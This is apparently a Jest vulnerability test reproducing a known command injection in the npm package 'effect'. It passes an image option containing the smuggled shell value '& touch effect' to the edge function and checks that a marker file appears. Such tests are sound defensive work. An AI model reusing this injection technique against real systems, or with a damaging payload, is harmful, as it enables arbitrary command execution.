//https://snyk.io/vuln/SNYK-JS-EFFECT-564256
test("Command Injection in effect", (done) => {
  expect.assertions(2);
  const Root = require("effect");
  const fs = require("fs");
  const path = "./effect";
  const sleep = require("sleep");
  var options = { image: "& touch effect" };
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  Root.edge(options, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    try {
      fs.unlinkSync("-colorspace");
      fs.unlinkSync("-edge");
      fs.unlinkSync("-negate");
      fs.unlinkSync("-resize");
      fs.unlinkSync("5");
      fs.unlinkSync("100%");
      fs.unlinkSync("Gray");
      fs.unlinkSync(path);
    } catch (err) {}
    done();
  });
});
